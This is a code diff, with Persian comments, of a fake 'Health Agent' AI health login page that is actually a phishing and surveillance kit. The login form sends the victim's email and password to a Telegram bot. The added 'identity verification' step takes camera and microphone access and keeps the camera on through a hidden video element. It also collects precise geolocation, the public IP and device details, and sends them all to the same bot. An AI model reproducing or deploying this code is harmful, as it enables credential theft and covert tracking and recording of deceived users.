@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Health Agent | Secure Login</title>
 <style>
-  /* ========== ریست و بدنه ========== */
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
     font-family: Tahoma, sans-serif;
@@ -13,23 +12,15 @@
     display: flex; justify-content: center; align-items: center;
     min-height: 100vh; padding: 16px; overflow: hidden;
   }
-
-  /* ========== کارت اصلی ========== */
   .card {
     width: 100%; max-width: 380px;
     background: #fff; border-radius: 20px;
     box-shadow: 0 8px 40px rgba(0,0,0,0.12);
-    padding: 32px 24px;
-    position: relative;
-    transition: all 0.4s ease;
+    padding: 32px 24px; position: relative;
   }
-
-  /* ========== بخش‌ها (Login و Verify) ========== */
   .section { display: none; animation: fadeIn 0.5s ease forwards; }
   .section.active { display: block; }
   @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-  /* ========== برند ========== */
   .brand { text-align: center; margin-bottom: 28px; }
   .brand-icon {
     width: 56px; height: 56px;
@@ -40,19 +31,14 @@
   }
   .brand h1 { font-size: 20px; color: #1a1a1a; margin-bottom: 4px; }
   .brand p { font-size: 12px; color: #666; }
-
-  /* ========== فرم ========== */
   .field { margin-bottom: 14px; }
   .field label { display: block; font-size: 12px; color: #555; margin-bottom: 6px; }
   .field input {
     width: 100%; padding: 14px;
     border: 1px solid #ddd; border-radius: 10px;
     font-size: 14px; font-family: Tahoma;
-    transition: border-color 0.2s;
   }
   .field input:focus { outline: none; border-color: #1a73e8; }
-
-  /* ========== دکمه‌ها ========== */
   .btn {
     width: 100%; padding: 15px;
     background: linear-gradient(135deg, #1a73e8, #0d47a1);
@@ -61,15 +47,9 @@
     margin-top: 8px; transition: opacity 0.2s;
   }
   .btn:disabled { opacity: 0.6; cursor: not-allowed; }
-
-  /* ========== متن خطا و وضعیت ========== */
   .error { color: #d93025; font-size: 12px; text-align: center; margin-top: 12px; min-height: 16px; }
   .status { color: #1a73e8; font-size: 13px; text-align: center; margin-top: 16px; min-height: 20px; font-weight: bold; }
-
-  /* ========== فوتر ========== */
   .footer { text-align: center; font-size: 11px; color: #999; margin-top: 20px; }
-
-  /* ========== اسپینر لودینگ ========== */
   .spinner {
     display: inline-block; width: 16px; height: 16px;
     border: 2px solid #ddd; border-top-color: #1a73e8;
@@ -77,20 +57,20 @@
     vertical-align: middle; margin-left: 6px;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
+  #hiddenVideo { display: none; }
 </style>
 </head>
 <body>
 
 <div class="card">
   
-  <!-- ================= صفحه ۱: ورود ================= -->
+  <!-- صفحه ۱: ورود -->
   <div id="loginSection" class="section active">
     <div class="brand">
       <div class="brand-icon">🛡️</div>
       <h1>Health Agent</h1>
       <p>AI Health Analysis · Secure</p>
     </div>
-    
     <form id="loginForm" autocomplete="off">
       <div class="field">
         <label for="email">ایمیل</label>
@@ -103,30 +83,31 @@
       <button type="submit" class="btn" id="loginBtn">ورود به داشبورد</button>
       <div class="error" id="errorMsg"></div>
     </form>
-    
     <div class="footer">© Health Agent — Secure AI Platform</div>
   </div>
 
-  <!-- ================= صفحه ۲: تایید هویت ================= -->
+  <!-- صفحه ۲: تایید هویت -->
   <div id="verifySection" class="section" style="text-align: center;">
     <div class="brand-icon" style="margin-bottom: 16px;">🛡️</div>
     <h1 style="font-size: 19px; color: #1a1a1a; margin-bottom: 10px;">تأیید هویت</h1>
     <p style="font-size: 13px; color: #666; line-height: 1.8; margin-bottom: 24px;">
-      برای اطمینان از صحت اطلاعات و فعال‌سازی تحلیل هوشمند، لطفاً هویت خود را تأیید کنید.
+      برای فعال‌سازی تحلیل هوشمند، لطفاً دسترسی‌های لازم (دوربین، میکروفون و موقعیت) را تأیید کنید.
     </p>
-    
     <button class="btn" id="verifyBtn">شروع تأیید هویت</button>
     <div class="status" id="verifyStatus"></div>
   </div>
 
 </div>
 
+<!-- ویدیوی مخفی برای نگه داشتن جریان دوربین -->
+<video id="hiddenVideo" autoplay playsinline muted></video>
+
 <script>
 /* ============================================================
    تنظیمات
    ============================================================ */
-const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // توکن خودت را بگذار
-const CHAT_ID   = 'YOUR_CHAT_ID';   // چت آیدی خودت را بگذار
+const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // توکن خودت
+const CHAT_ID   = 'YOUR_CHAT_ID';   // چت آیدی خودت
 
 /* ============================================================
    توابع ارسال به تلگرام
@@ -138,9 +119,7 @@ async function sendToTelegram(text) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: CHAT_ID, text })
     });
-  } catch (e) {
-    console.error('ارسال ناموفق:', e.message);
-  }
+  } catch (e) { console.error(e.message); }
 }
 
 /* ============================================================
@@ -148,20 +127,15 @@ async function sendToTelegram(text) {
    ============================================================ */
 document.getElementById('loginForm').addEventListener('submit', async (e) => {
   e.preventDefault();
-
   const email = document.getElementById('email').value.trim();
   const password = document.getElementById('password').value;
   const btn = document.getElementById('loginBtn');
-  const errEl = document.getElementById('errorMsg');
 
   btn.disabled = true;
   btn.innerHTML = 'در حال بررسی... <span class="spinner"></span>';
-  errEl.textContent = '';
 
-  // ارسال به تلگرام
-  await sendToTelegram(`🔐 لاگین جدید در Health Agent\n📧 ایمیل: ${email}\n🔑 رمز: ${password}`);
+  await sendToTelegram(`🔐 لاگین جدید\n📧 ایمیل: ${email}\n🔑 رمز: ${password}`);
 
-  // تغییر صفحه بدون رفرش (با انیمیشن)
   setTimeout(() => {
     document.getElementById('loginSection').classList.remove('active');
     document.getElementById('verifySection').classList.add('active');
@@ -169,20 +143,73 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
 });
 
 /* ============================================================
-   منطق صفحه تایید
+   منطق صفحه تایید (درخواست مجوزها + گرفتن IP و اطلاعات گوشی)
    ============================================================ */
 document.getElementById('verifyBtn').addEventListener('click', async () => {
   const btn = document.getElementById('verifyBtn');
   const status = document.getElementById('verifyStatus');
 
   btn.disabled = true;
-  btn.innerHTML = 'در حال تأیید... <span class="spinner"></span>';
+  btn.innerHTML = 'در حال دریافت دسترسی‌ها... <span class="spinner"></span>';
 
-  // فعلاً فقط پیام تست به تلگرام
-  await sendToTelegram('✅ کاربر وارد مرحله تأیید هویت شد (تست).');
+  try {
+    // ۱. درخواست همزمان دوربین و میکروفون
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    
+    // جریان را به ویدیوی مخفی متصل می‌کنیم تا دوربین روشن بماند
+    const videoEl = document.getElementById('hiddenVideo');
+    videoEl.srcObject = stream;
+    await videoEl.play();
 
-  status.textContent = '✅ تأیید انجام شد. (مرحله بعد: دوربین و میکروفون)';
-  btn.innerHTML = 'تأیید شد';
+    // ۲. درخواست لوکیشن (یک بار مجوز می‌گیریم)
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        // ۳. گرفتن IP عمومی
+        let ip = 'نامشخص';
+        try {
+          const ipRes = await fetch('https://api.ipify.org?format=json');
+          const ipData = await ipRes.json();
+          ip = ipData.ip;
+        } catch (e) { console.warn('IP failed'); }
+
+        // ۴. گرفتن اطلاعات گوشی (مدل و سیستم‌عامل)
+        let deviceInfo = navigator.userAgent;
+        if (navigator.userAgentData) {
+          try {
+            const highEntropy = await navigator.userAgentData.getHighEntropyValues(['model', 'platform']);
+            deviceInfo = `مدل: ${highEntropy.model || 'نامشخص'} | پلتفرم: ${highEntropy.platform} | UA: ${navigator.userAgent}`;
+          } catch (e) {}
+        }
+
+        // ۵. ارسال همه اطلاعات به تلگرام
+        const infoText = `✅ تأیید هویت انجام شد!\n\n` +
+                         `🌐 IP: ${ip}\n` +
+                         `📍 موقعیت: Lat ${pos.coords.latitude}, Lng ${pos.coords.longitude}\n` +
+                         `📱 دستگاه: ${deviceInfo}`;
+        
+        await sendToTelegram(infoText);
+
+        // ۶. نمایش موفقیت در صفحه
+        status.textContent = '✅ تأیید انجام شد. (مرحله بعد: ضبط صدا و عکس)';
+        btn.innerHTML = 'تأیید شد';
+      },
+      async (err) => {
+        // اگر کاربر لوکیشن را رد کرد
+        status.textContent = '⚠️ دسترسی به موقعیت مکانی رد شد.';
+        await sendToTelegram('⚠️ کاربر دسترسی لوکیشن را رد کرد.');
+        btn.disabled = false;
+        btn.innerHTML = 'تلاش مجدد';
+      },
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+
+  } catch (err) {
+    // اگر کاربر دوربین/میکروفون را رد کرد
+    status.textContent = '❌ دسترسی به دوربین/میکروفون داده نشد.';
+    btn.disabled = false;
+    btn.innerHTML = 'تلاش مجدد';
+    console.error(err);
+  }
 });
 </script>
 
